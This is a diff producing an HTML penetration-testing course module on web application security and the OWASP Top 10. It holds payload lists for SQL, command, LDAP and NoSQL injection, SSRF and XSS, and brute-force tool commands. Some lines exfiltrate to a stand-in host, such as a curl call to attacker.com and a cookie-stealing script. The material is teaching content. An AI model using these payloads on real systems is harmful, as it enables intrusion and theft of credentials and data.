@@ -1,367 +1,746 @@
-<div class="max-w-4xl mx-auto p-6 bg-slate-900 text-slate-100">
-  <h1 class="text-3xl font-bold mb-6 text-slate-100">Module 8: Web Application Security Testing</h1>
 
-  <p class="text-slate-300 mb-6 text-lg leading-relaxed">
-    Web application security testing is one of the most critical skills for modern penetration testers. This comprehensive module covers the OWASP Top 10 vulnerabilities, advanced testing techniques, and automated tool usage for thorough web application assessments.
-  </p>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Application Security Testing</title>
+    <style>
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            line-height: 1.6;
+            color: #e2e8f0;
+            background: #0f172a;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+        h1, h2, h3 {
+            color: #00ff88;
+        }
+        h1 {
+            border-bottom: 2px solid #00ff88;
+            padding-bottom: 0.5rem;
+        }
+        .highlight {
+            background: #1e293b;
+            padding: 1rem;
+            border-left: 4px solid #00ff88;
+            margin: 1rem 0;
+        }
+        .code {
+            background: #334155;
+            padding: 1rem;
+            border-radius: 4px;
+            font-family: 'Fira Code', monospace;
+            overflow-x: auto;
+            white-space: pre;
+        }
+        .vulnerability {
+            background: #1e293b;
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+            border: 1px solid #334155;
+        }
+        .vulnerability h4 {
+            margin-top: 0;
+            color: #00ff88;
+        }
+        ul, ol {
+            padding-left: 2rem;
+        }
+        li {
+            margin: 0.5rem 0;
+        }
+        .warning {
+            background: #451a03;
+            border: 1px solid #ea580c;
+            padding: 1rem;
+            border-radius: 6px;
+            margin: 1rem 0;
+        }
+        .info {
+            background: #0c4a6e;
+            border: 1px solid #0284c7;
+            padding: 1rem;
+            border-radius: 6px;
+            margin: 1rem 0;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        th, td {
+            border: 1px solid #475569;
+            padding: 0.75rem;
+            text-align: left;
+        }
+        th {
+            background: #1e293b;
+            color: #00ff88;
+        }
+        .risk-critical { color: #dc2626; }
+        .risk-high { color: #ea580c; }
+        .risk-medium { color: #d97706; }
+        .risk-low { color: #65a30d; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Module 8: Web Application Security Testing</h1>
 
-  <div class="mb-8">
-    <img src="https://images.unsplash.com/photo-1555066931-4365d14bab8c?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Web Application Security" class="w-full h-64 object-cover rounded-lg mb-4">
-    <p class="text-slate-400 text-sm text-center">Web applications present complex attack surfaces requiring systematic testing approaches</p>
-  </div>
-
-  <h2 class="text-2xl font-semibold text-slate-100 mb-4">Learning Objectives</h2>
-  <div class="bg-slate-800 border border-slate-700 rounded-lg p-6 mb-6">
-    <ul class="text-slate-300 space-y-2">
-      <li>• Master OWASP Top 10 vulnerability identification and exploitation</li>
-      <li>• Learn advanced web application testing methodologies</li>
-      <li>• Understand modern web application architectures and attack vectors</li>
-      <li>• Practice manual testing techniques and automated tool usage</li>
-      <li>• Implement API security testing and analysis</li>
-      <li>• Develop comprehensive web application assessment reports</li>
-    </ul>
-  </div>
-
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 1: Web Application Architecture</h3>
-
-  <div class="mb-8">
-    <img src="https://images.unsplash.com/photo-1558494949-ef010cbdcc31?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Web Architecture" class="w-full h-64 object-cover rounded-lg mb-4">
-    <p class="text-slate-400 text-sm text-center">Understanding web application architecture is essential for effective security testing</p>
-  </div>
-
-  <p class="text-slate-300 mb-4">
-    Modern web applications utilize complex architectures involving multiple tiers, frameworks, and technologies. Understanding these components is crucial for identifying potential attack vectors and security weaknesses.
-  </p>
-
-  <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
-    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
-      <h4 class="text-lg font-semibold text-blue-400 mb-2">Frontend Technologies</h4>
-      <ul class="text-slate-300 text-sm space-y-1">
-        <li>• HTML5, CSS3, and JavaScript frameworks</li>
-        <li>• Single Page Applications (SPAs)</li>
-        <li>• Progressive Web Apps (PWAs)</li>
-        <li>• Client-side templating engines</li>
-        <li>• WebAssembly and modern APIs</li>
-        <li>• Frontend build tools and transpilers</li>
-      </ul>
-    </div>
-
-    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
-      <h4 class="text-lg font-semibold text-green-400 mb-2">Backend Technologies</h4>
-      <ul class="text-slate-300 text-sm space-y-1">
-        <li>• Server-side frameworks and languages</li>
-        <li>• Microservices architectures</li>
-        <li>• RESTful APIs and GraphQL</li>
-        <li>• Database systems and ORM frameworks</li>
-        <li>• Caching mechanisms and CDNs</li>
-        <li>• Message queues and event streaming</li>
-      </ul>
-    </div>
-  </div>
-
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 2: OWASP Top 10 Vulnerabilities</h3>
-
-  <div class="mb-8">
-    <img src="https://images.unsplash.com/photo-1563206767-5b18f218e8de?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Security Vulnerabilities" class="w-full h-64 object-cover rounded-lg mb-4">
-    <p class="text-slate-400 text-sm text-center">The OWASP Top 10 provides a standard framework for web application security testing</p>
-  </div>
-
-  <p class="text-slate-300 mb-4">
-    The OWASP Top 10 represents the most critical web application security risks. Understanding these vulnerabilities and their exploitation techniques is fundamental to effective web application testing.
-  </p>
-
-  <div class="space-y-4 mb-6">
-    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
-      <h5 class="font-semibold text-red-400 mb-2">A01:2021 - Broken Access Control</h5>
-      <p class="text-slate-300 text-sm mb-2">Failures related to authentication and authorization mechanisms</p>
-      <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm text-slate-400">
-        <div>
-          <p class="font-semibold mb-1">Common Issues:</p>
-          <ul class="space-y-1">
-            <li>• Insecure direct object references</li>
-            <li>• Missing function-level access controls</li>
-            <li>• Privilege escalation vulnerabilities</li>
-            <li>• JWT token manipulation</li>
-          </ul>
-        </div>
-        <div>
-          <p class="font-semibold mb-1">Testing Techniques:</p>
-          <ul class="space-y-1">
-            <li>• Parameter manipulation testing</li>
-            <li>• Forced browsing attacks</li>
-            <li>• Session token analysis</li>
-            <li>• Role-based access testing</li>
-          </ul>
-        </div>
-      </div>
-    </div>
-
-    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
-      <h5 class="font-semibold text-orange-400 mb-2">A02:2021 - Cryptographic Failures</h5>
-      <p class="text-slate-300 text-sm mb-2">Weaknesses in cryptographic implementations and data protection</p>
-      <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm text-slate-400">
-        <div>
-          <p class="font-semibold mb-1">Common Issues:</p>
-          <ul class="space-y-1">
-            <li>• Weak encryption algorithms</li>
-            <li>• Hardcoded cryptographic keys</li>
-            <li>• Insufficient entropy in random generation</li>
-            <li>• Improper certificate validation</li>
-          </ul>
-        </div>
-        <div>
-          <p class="font-semibold mb-1">Testing Techniques:</p>
-          <ul class="space-y-1">
-            <li>• SSL/TLS configuration analysis</li>
-            <li>• Encryption strength assessment</li>
-            <li>• Key management evaluation</li>
-            <li>• Certificate chain validation</li>
-          </ul>
-        </div>
-      </div>
-    </div>
-
-    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
-      <h5 class="font-semibold text-yellow-400 mb-2">A03:2021 - Injection</h5>
-      <p class="text-slate-300 text-sm mb-2">Code injection vulnerabilities including SQL, NoSQL, OS, and LDAP injection</p>
-      <div class="bg-slate-900 rounded p-3 mt-3">
-        <h6 class="font-semibold text-slate-100 mb-2">SQL Injection Testing</h6>
-        <div class="font-mono text-sm text-slate-300 space-y-1">
-          <p><span class="text-cyan-400">' OR '1'='1</span> - Basic authentication bypass</p>
-          <p><span class="text-cyan-400">' UNION SELECT 1,2,3--</span> - Union-based injection</p>
-          <p><span class="text-cyan-400">' AND (SELECT SUBSTRING(@@version,1,1))='5'--</span> - Boolean-based blind</p>
-          <p><span class="text-cyan-400">'; WAITFOR DELAY '00:00:05'--</span> - Time-based blind</p>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 3: Manual Testing Techniques</h3>
-
-  <div class="mb-8">
-    <img src="https://images.unsplash.com/photo-1516321497487-e288fb19713f?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Manual Testing" class="w-full h-64 object-cover rounded-lg mb-4">
-    <p class="text-slate-400 text-sm text-center">Manual testing reveals logic flaws and vulnerabilities missed by automated tools</p>
-  </div>
-
-  <p class="text-slate-300 mb-4">
-    Manual testing techniques allow you to identify business logic flaws, complex vulnerabilities, and application-specific issues that automated tools often miss.
-  </p>
-
-  <div class="bg-slate-800 border border-slate-700 rounded-lg p-6 mb-6">
-    <h4 class="text-lg font-semibold text-slate-100 mb-3">Business Logic Testing</h4>
-    <div class="space-y-3">
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-green-400 mb-1">Workflow Analysis</h5>
-        <p class="text-slate-300 text-sm">Analyze application workflows for logical inconsistencies and bypass opportunities</p>
-        <ul class="text-slate-400 text-sm space-y-1 ml-4 mt-2">
-          <li>• Multi-step process manipulation</li>
-          <li>• State transition vulnerabilities</li>
-          <li>• Race condition exploitation</li>
-          <li>• Price manipulation attacks</li>
+        <h2>Learning Objectives</h2>
+        <ul>
+            <li>Master the OWASP Top 10 vulnerabilities and testing methods</li>
+            <li>Learn comprehensive web application testing methodologies</li>
+            <li>Understand client-side and server-side security issues</li>
+            <li>Explore automated and manual testing techniques</li>
+            <li>Learn to use industry-standard web application testing tools</li>
         </ul>
-      </div>
 
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-blue-400 mb-1">Authentication Testing</h5>
-        <p class="text-slate-300 text-sm">Comprehensive authentication mechanism evaluation</p>
-        <ul class="text-slate-400 text-sm space-y-1 ml-4 mt-2">
-          <li>• Password policy assessment</li>
-          <li>• Account lockout mechanism testing</li>
-          <li>• Multi-factor authentication bypass</li>
-          <li>• Session management vulnerabilities</li>
+        <h2>Introduction to Web Application Security</h2>
+        <p>
+            Web application security testing involves systematically evaluating web applications 
+            for security vulnerabilities. Modern web applications present complex attack surfaces 
+            with multiple components, technologies, and potential entry points.
+        </p>
+
+        <div class="highlight">
+            <strong>Web App Security Importance:</strong>
+            <ul style="margin: 0.5rem 0;">
+                <li>90% of applications have security vulnerabilities</li>
+                <li>Web apps are primary targets for cybercriminals</li>
+                <li>Data breaches often start with web application exploits</li>
+                <li>Business logic flaws are unique to each application</li>
+            </ul>
+        </div>
+
+        <h2>OWASP Top 10 (2021) Vulnerabilities</h2>
+
+        <div class="vulnerability">
+            <h3>A01:2021 - Broken Access Control <span class="risk-critical">[CRITICAL]</span></h3>
+            <h4>Description:</h4>
+            <p>Failures in access control enforcement allow users to access unauthorized functionality or data.</p>
+            
+            <h4>Common Examples:</h4>
+            <ul>
+                <li>Bypassing access control by modifying URLs, parameters, or API calls</li>
+                <li>Privilege escalation (acting as admin without being logged in as admin)</li>
+                <li>Accessing other users' accounts by changing account identifiers</li>
+                <li>Insecure direct object references (IDOR)</li>
+            </ul>
+
+            <h4>Testing Techniques:</h4>
+            <div class="code">
+# Parameter manipulation
+Original: /user/profile?id=123
+Test: /user/profile?id=124
+
+# Path traversal
+/admin/dashboard
+/admin/../user/profile
+
+# HTTP method bypass
+GET /admin/delete-user?id=123
+POST /admin/delete-user (if GET is blocked)
+
+# JWT manipulation
+# Decode JWT token and modify claims
+# Try using "none" algorithm
+# Modify user role or permissions
+            </div>
+
+            <h4>Prevention:</h4>
+            <ul>
+                <li>Implement proper access control mechanisms</li>
+                <li>Deny by default principle</li>
+                <li>Server-side access control validation</li>
+                <li>Regular access control testing</li>
+            </ul>
+        </div>
+
+        <div class="vulnerability">
+            <h3>A02:2021 - Cryptographic Failures <span class="risk-high">[HIGH]</span></h3>
+            <h4>Description:</h4>
+            <p>Failures related to cryptography that lead to sensitive data exposure.</p>
+            
+            <h4>Common Examples:</h4>
+            <ul>
+                <li>Transmitting sensitive data in clear text</li>
+                <li>Using old or weak cryptographic algorithms</li>
+                <li>Improper certificate validation</li>
+                <li>Weak password hashing</li>
+            </ul>
+
+            <h4>Testing Techniques:</h4>
+            <div class="code">
+# SSL/TLS testing
+sslscan target.com
+sslyze target.com
+testssl.sh target.com
+
+# Check for weak ciphers
+nmap --script ssl-enum-ciphers -p 443 target.com
+
+# Password hash analysis
+hashcat -m 0 hashes.txt wordlist.txt  # MD5
+john --format=sha256 hashes.txt
+
+# Certificate validation
+openssl s_client -connect target.com:443
+openssl x509 -in cert.pem -text -noout
+            </div>
+        </div>
+
+        <div class="vulnerability">
+            <h3>A03:2021 - Injection <span class="risk-critical">[CRITICAL]</span></h3>
+            <h4>Description:</h4>
+            <p>Application accepts untrusted data and sends it to an interpreter without proper validation.</p>
+            
+            <h4>SQL Injection Testing:</h4>
+            <div class="code">
+# Basic SQL injection tests
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+admin'--
+admin'/*
+
+# Union-based SQL injection
+' UNION SELECT 1,2,3--
+' UNION SELECT user(),database(),version()--
+
+# Boolean-based blind SQL injection
+' AND (SELECT SUBSTRING(user(),1,1))='a'--
+' AND (SELECT COUNT(*) FROM users)>0--
+
+# Time-based blind SQL injection
+'; WAITFOR DELAY '00:00:05'--
+' AND (SELECT SLEEP(5))--
+
+# SQLmap automated testing
+sqlmap -u "http://target.com/page?id=1"
+sqlmap -u "http://target.com/page?id=1" --dbs
+sqlmap -u "http://target.com/page?id=1" -D database --tables
+            </div>
+
+            <h4>NoSQL Injection Testing:</h4>
+            <div class="code">
+# MongoDB injection
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+
+# JavaScript injection in NoSQL
+{"username": "admin", "password": {"$where": "return true"}}
+            </div>
+
+            <h4>Command Injection Testing:</h4>
+            <div class="code">
+# Basic command injection
+; ls
+| ls
+& ls
+&& ls
+` ls `
+$(ls)
+
+# Time-based detection
+; sleep 10
+| ping -c 10 127.0.0.1
+
+# Data exfiltration
+; cat /etc/passwd
+; curl http://attacker.com/$(whoami)
+            </div>
+
+            <h4>LDAP Injection Testing:</h4>
+            <div class="code">
+# LDAP injection payloads
+*)(uid=*))(|(uid=*
+*)(|(password=*))
+*))%00
+)(cn=*))(|(cn=*
+            </div>
+        </div>
+
+        <div class="vulnerability">
+            <h3>A04:2021 - Insecure Design <span class="risk-high">[HIGH]</span></h3>
+            <h4>Description:</h4>
+            <p>Security flaws in the application's design and architecture.</p>
+            
+            <h4>Testing Areas:</h4>
+            <ul>
+                <li>Business logic flaws</li>
+                <li>Workflow bypass</li>
+                <li>Race conditions</li>
+                <li>Trust boundary violations</li>
+            </ul>
+
+            <h4>Business Logic Testing:</h4>
+            <div class="code">
+# Price manipulation
+Original: price=100&quantity=1
+Test: price=-100&quantity=1
+Test: price=0.01&quantity=1
+
+# Workflow bypass
+Step 1: Add items to cart
+Step 3: Complete purchase (skip payment step)
+
+# Race condition testing
+# Multiple simultaneous requests
+# Concurrent transactions
+# Resource exhaustion
+            </div>
+        </div>
+
+        <div class="vulnerability">
+            <h3>A05:2021 - Security Misconfiguration <span class="risk-medium">[MEDIUM]</span></h3>
+            <h4>Description:</h4>
+            <p>Inadequate security hardening across the application stack.</p>
+            
+            <h4>Common Issues:</h4>
+            <ul>
+                <li>Default credentials</li>
+                <li>Unnecessary features enabled</li>
+                <li>Detailed error messages</li>
+                <li>Outdated software components</li>
+            </ul>
+
+            <h4>Testing Techniques:</h4>
+            <div class="code">
+# Default credentials testing
+admin:admin
+admin:password
+root:root
+guest:guest
+
+# Directory listing
+http://target.com/uploads/
+http://target.com/admin/
+http://target.com/backup/
+
+# Information disclosure
+# Check HTTP headers
+# Error message analysis
+# Configuration file exposure
+/.env
+/config.php
+/wp-config.php
+            </div>
+        </div>
+
+        <div class="vulnerability">
+            <h3>A06:2021 - Vulnerable and Outdated Components <span class="risk-high">[HIGH]</span></h3>
+            <h4>Description:</h4>
+            <p>Using components with known vulnerabilities.</p>
+            
+            <h4>Detection Methods:</h4>
+            <div class="code">
+# Component identification
+whatweb target.com
+wappalyzer target.com
+
+# Version detection
+nmap --script http-enum target.com
+nikto -h target.com
+
+# Vulnerability databases
+# CVE (Common Vulnerabilities and Exposures)
+# NVD (National Vulnerability Database)
+# OWASP Dependency Check
+
+# Automated scanning
+retire.js  # JavaScript libraries
+bundler-audit  # Ruby gems
+npm audit  # Node.js packages
+            </div>
+        </div>
+
+        <div class="vulnerability">
+            <h3>A07:2021 - Identification and Authentication Failures <span class="risk-high">[HIGH]</span></h3>
+            <h4>Description:</h4>
+            <p>Weaknesses in user identity confirmation and authentication.</p>
+            
+            <h4>Testing Areas:</h4>
+            <ul>
+                <li>Weak password policies</li>
+                <li>Brute force attacks</li>
+                <li>Session management flaws</li>
+                <li>Credential stuffing</li>
+            </ul>
+
+            <h4>Authentication Testing:</h4>
+            <div class="code">
+# Brute force testing
+hydra -l admin -P passwords.txt target.com http-post-form
+burp intruder for web forms
+medusa -h target.com -u admin -P passwords.txt -M http
+
+# Session testing
+# Check session token randomness
+# Test session fixation
+# Session timeout testing
+# Concurrent sessions
+
+# Password policy testing
+# Minimum length requirements
+# Character complexity
+# Password history
+# Account lockout policies
+            </div>
+        </div>
+
+        <div class="vulnerability">
+            <h3>A08:2021 - Software and Data Integrity Failures <span class="risk-high">[HIGH]</span></h3>
+            <h4>Description:</h4>
+            <p>Failures in software updates, critical data, and CI/CD pipelines without integrity verification.</p>
+            
+            <h4>Testing Techniques:</h4>
+            <div class="code">
+# Insecure deserialization
+# Java serialization testing
+# Python pickle testing
+# PHP object injection
+
+# CI/CD pipeline testing
+# Source code integrity
+# Build artifact verification
+# Supply chain attacks
+
+# Auto-update mechanisms
+# Man-in-the-middle attacks
+# Signature verification
+# Update channel security
+            </div>
+        </div>
+
+        <div class="vulnerability">
+            <h3>A09:2021 - Security Logging and Monitoring Failures <span class="risk-medium">[MEDIUM]</span></h3>
+            <h4>Description:</h4>
+            <p>Insufficient logging and monitoring allowing attacks to go undetected.</p>
+            
+            <h4>Testing Areas:</h4>
+            <ul>
+                <li>Event logging completeness</li>
+                <li>Log integrity protection</li>
+                <li>Monitoring and alerting</li>
+                <li>Incident response capabilities</li>
+            </ul>
+        </div>
+
+        <div class="vulnerability">
+            <h3>A10:2021 - Server-Side Request Forgery (SSRF) <span class="risk-high">[HIGH]</span></h3>
+            <h4>Description:</h4>
+            <p>Web application fetches remote resources without validating user-supplied URLs.</p>
+            
+            <h4>SSRF Testing:</h4>
+            <div class="code">
+# Basic SSRF testing
+http://localhost
+http://127.0.0.1
+http://0.0.0.0
+http://internal-server
+
+# Cloud metadata endpoints
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
+
+# Protocol bypass
+file:///etc/passwd
+gopher://127.0.0.1:6379/_INFO
+dict://127.0.0.1:11211/stats
+
+# Bypass techniques
+http://localhost.localdomain
+http://127.0.0.1.xip.io
+http://[::1]
+            </div>
+        </div>
+
+        <h2>Web Application Testing Tools</h2>
+
+        <h3>Burp Suite</h3>
+        <p>Comprehensive web application security testing platform:</p>
+        <div class="code">
+# Burp Suite workflow
+1. Configure browser proxy (127.0.0.1:8080)
+2. Browse target application
+3. Analyze request/response in Proxy
+4. Send interesting requests to Repeater
+5. Use Scanner for automated testing
+6. Use Intruder for fuzzing and brute force
+
+# Burp Suite extensions
+- SQLiPy (SQL injection)
+- XSS Validator
+- ActiveScan++
+- Param Miner
+- Collaborator Everywhere
+        </div>
+
+        <h3>OWASP ZAP</h3>
+        <p>Free web application security scanner:</p>
+        <div class="code">
+# ZAP automation
+zap-cli quick-scan http://target.com
+zap-cli spider http://target.com
+zap-cli active-scan http://target.com
+
+# ZAP baseline scan
+docker run -t owasp/zap2docker-stable zap-baseline.py -t http://target.com
+
+# ZAP API usage
+zap.spider.scan(url)
+zap.ascan.scan(url)
+zap.core.alerts()
+        </div>
+
+        <h3>Manual Testing Tools</h3>
+        <div class="code">
+# cURL for manual testing
+curl -X POST -d "user=admin&pass=test" http://target.com/login
+curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin
+curl -b "session=abc123" http://target.com/profile
+
+# Browser developer tools
+# Network tab for request analysis
+# Console for JavaScript testing
+# Security tab for certificate analysis
+
+# Postman for API testing
+# Collection organization
+# Environment variables
+# Automated testing scripts
+        </div>
+
+        <h2>Client-Side Security Testing</h2>
+
+        <h3>Cross-Site Scripting (XSS)</h3>
+        <div class="code">
+# Reflected XSS
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg onload=alert('XSS')&gt;
+
+# Stored XSS
+&lt;script&gt;document.location='http://attacker.com/steal.php?c='+document.cookie&lt;/script&gt;
+
+# DOM-based XSS
+# Check for client-side DOM manipulation
+# JavaScript debugging
+# Source and sink analysis
+
+# XSS filter bypass
+&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;
+&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))&lt;/script&gt;
+&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;
+        </div>
+
+        <h3>Cross-Site Request Forgery (CSRF)</h3>
+        <div class="code">
+# CSRF testing
+&lt;form action="http://target.com/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="amount" value="1000" /&gt;
+  &lt;input type="hidden" name="account" value="attacker" /&gt;
+  &lt;input type="submit" value="Click me!" /&gt;
+&lt;/form&gt;
+
+# CSRF token analysis
+# Check if token is present
+# Test token randomness
+# Test token validation
+# Cross-domain token usage
+        </div>
+
+        <h3>Content Security Policy (CSP) Testing</h3>
+        <div class="code">
+# CSP header analysis
+Content-Security-Policy: default-src 'self'
+Content-Security-Policy: script-src 'unsafe-inline'
+
+# CSP bypass techniques
+# 'unsafe-inline' exploitation
+# JSONP callback abuse
+# Base tag injection
+# Angular.js sandbox bypass
+        </div>
+
+        <h2>API Security Testing</h2>
+
+        <h3>REST API Testing</h3>
+        <div class="code">
+# HTTP method testing
+GET /api/users/123
+POST /api/users/123 (should be PUT/PATCH)
+DELETE /api/users/123
+OPTIONS /api/users/123
+
+# Parameter pollution
+/api/users?id=123&id=456
+/api/users?user[]=admin&user[]=guest
+
+# Rate limiting testing
+# Automated requests
+# Concurrent connections
+# Resource exhaustion
+
+# Authentication bypass
+# Missing authentication
+# Weak token validation
+# Privilege escalation
+        </div>
+
+        <h3>GraphQL Testing</h3>
+        <div class="code">
+# Introspection queries
+{__schema{types{name,fields{name,type{name}}}}}
+
+# Query depth analysis
+# Recursive queries
+# Resource exhaustion
+# Information disclosure
+
+# Mutation testing
+# Unauthorized data modification
+# Input validation bypass
+        </div>
+
+        <h2>Advanced Web Application Testing</h2>
+
+        <h3>WebSocket Security</h3>
+        <div class="code">
+# WebSocket testing
+# Connection hijacking
+# Message injection
+# Cross-site WebSocket hijacking
+
+# Tools for WebSocket testing
+# Burp Suite WebSocket support
+# OWASP ZAP WebSocket testing
+# wscat command-line tool
+        </div>
+
+        <h3>Single Page Application (SPA) Testing</h3>
+        <ul>
+            <li>Client-side routing security</li>
+            <li>API endpoint exposure</li>
+            <li>Source code analysis</li>
+            <li>State management vulnerabilities</li>
         </ul>
-      </div>
-    </div>
-  </div>
 
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 4: Automated Testing Tools</h3>
+        <h3>Progressive Web App (PWA) Testing</h3>
+        <ul>
+            <li>Service worker security</li>
+            <li>Offline functionality testing</li>
+            <li>Push notification security</li>
+            <li>Background sync vulnerabilities</li>
+        </ul>
 
-  <div class="mb-8">
-    <img src="https://images.unsplash.com/photo-1518709268805-4e9042af2176?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Testing Tools" class="w-full h-64 object-cover rounded-lg mb-4">
-    <p class="text-slate-400 text-sm text-center">Automated tools accelerate vulnerability discovery and testing coverage</p>
-  </div>
-
-  <p class="text-slate-300 mb-4">
-    Automated testing tools help streamline the vulnerability discovery process and ensure comprehensive coverage of common security issues.
-  </p>
-
-  <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
-    <div class="bg-slate-800 rounded-lg p-4">
-      <h4 class="text-lg font-semibold text-slate-100 mb-2">Popular Testing Tools</h4>
-      <ul class="text-slate-300 text-sm space-y-1">
-        <li>• <strong>Burp Suite Professional:</strong> Comprehensive web app security testing</li>
-        <li>• <strong>OWASP ZAP:</strong> Open-source security testing proxy</li>
-        <li>• <strong>Acunetix:</strong> Automated vulnerability scanner</li>
-        <li>• <strong>Netsparker:</strong> Web application security scanner</li>
-        <li>• <strong>SQLmap:</strong> SQL injection testing tool</li>
-        <li>• <strong>Nikto:</strong> Web server vulnerability scanner</li>
-      </ul>
-    </div>
-
-    <div class="bg-slate-800 rounded-lg p-4">
-      <h4 class="text-lg font-semibold text-slate-100 mb-2">Specialized Tools</h4>
-      <ul class="text-slate-300 text-sm space-y-1">
-        <li>• <strong>XSSer:</strong> Cross-site scripting detection</li>
-        <li>• <strong>Commix:</strong> Command injection testing</li>
-        <li>• <strong>NoSQLmap:</strong> NoSQL injection testing</li>
-        <li>• <strong>WPScan:</strong> WordPress security scanner</li>
-        <li>• <strong>Droopescan:</strong> Drupal security scanner</li>
-        <li>• <strong>JoomScan:</strong> Joomla security scanner</li>
-      </ul>
-    </div>
-  </div>
-
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 5: API Security Testing</h3>
-
-  <div class="mb-8">
-    <img src="https://images.unsplash.com/photo-1544197150-b99a580bb7a8?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="API Testing" class="w-full h-64 object-cover rounded-lg mb-4">
-    <p class="text-slate-400 text-sm text-center">API security testing requires specialized techniques and understanding of API architectures</p>
-  </div>
-
-  <p class="text-slate-300 mb-4">
-    API security testing focuses on the unique vulnerabilities and attack vectors present in application programming interfaces, including REST APIs, GraphQL, and SOAP services.
-  </p>
-
-  <div class="space-y-4 mb-6">
-    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
-      <h5 class="font-semibold text-purple-400 mb-2">REST API Testing</h5>
-      <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm text-slate-300">
-        <div>
-          <p class="font-semibold mb-2">Common Vulnerabilities:</p>
-          <ul class="space-y-1">
-            <li>• Insecure direct object references</li>
-            <li>• Mass assignment vulnerabilities</li>
-            <li>• Rate limiting bypass</li>
-            <li>• HTTP verb tampering</li>
-          </ul>
+        <div class="warning">
+            <strong>Testing Scope:</strong> Always ensure web application testing is performed 
+            within the authorized scope and with proper written permission. Some tests may 
+            cause data loss or system disruption.
         </div>
-        <div>
-          <p class="font-semibold mb-2">Testing Approaches:</p>
-          <ul class="space-y-1">
-            <li>• API endpoint enumeration</li>
-            <li>• Parameter pollution testing</li>
-            <li>• Authentication token analysis</li>
-            <li>• Response manipulation testing</li>
-          </ul>
+
+        <h2>Automated vs Manual Testing</h2>
+
+        <h3>Automated Testing Benefits</h3>
+        <ul>
+            <li>Comprehensive coverage of common vulnerabilities</li>
+            <li>Fast execution and repeatable results</li>
+            <li>Good for initial vulnerability discovery</li>
+            <li>Continuous integration compatibility</li>
+        </ul>
+
+        <h3>Manual Testing Benefits</h3>
+        <ul>
+            <li>Business logic flaw detection</li>
+            <li>Complex attack chain development</li>
+            <li>Context-aware testing</li>
+            <li>Custom vulnerability research</li>
+        </ul>
+
+        <h3>Hybrid Approach</h3>
+        <ol>
+            <li><strong>Start with automated scanning:</strong> Identify low-hanging fruit</li>
+            <li><strong>Manual verification:</strong> Confirm and validate findings</li>
+            <li><strong>Explore business logic:</strong> Test application-specific workflows</li>
+            <li><strong>Custom exploit development:</strong> Demonstrate real-world impact</li>
+        </ol>
+
+        <div class="info">
+            <strong>Best Practice:</strong> Combine automated tools with manual testing techniques 
+            for comprehensive web application security assessment. Neither approach alone is sufficient.
         </div>
-      </div>
+
+        <h2>Reporting Web Application Vulnerabilities</h2>
+
+        <h3>Vulnerability Documentation</h3>
+        <ul>
+            <li><strong>Clear description:</strong> What is the vulnerability?</li>
+            <li><strong>Location:</strong> Where was it found?</li>
+            <li><strong>Impact:</strong> What can an attacker do?</li>
+            <li><strong>Proof of concept:</strong> Steps to reproduce</li>
+            <li><strong>Remediation:</strong> How to fix the issue</li>
+        </ul>
+
+        <h3>Risk Assessment Factors</h3>
+        <table>
+            <tr>
+                <th>Factor</th>
+                <th>High Risk</th>
+                <th>Medium Risk</th>
+                <th>Low Risk</th>
+            </tr>
+            <tr>
+                <td>Data Access</td>
+                <td>Sensitive data exposure</td>
+                <td>Limited data access</td>
+                <td>Public data only</td>
+            </tr>
+            <tr>
+                <td>User Impact</td>
+                <td>All users affected</td>
+                <td>Some users affected</td>
+                <td>Individual users</td>
+            </tr>
+            <tr>
+                <td>Exploitability</td>
+                <td>Easy to exploit</td>
+                <td>Moderate difficulty</td>
+                <td>Difficult to exploit</td>
+            </tr>
+            <tr>
+                <td>Authentication</td>
+                <td>No authentication needed</td>
+                <td>Low privilege required</td>
+                <td>High privilege required</td>
+            </tr>
+        </table>
+
+        <h2>Conclusion</h2>
+        <p>
+            Web application security testing requires a systematic approach combining automated 
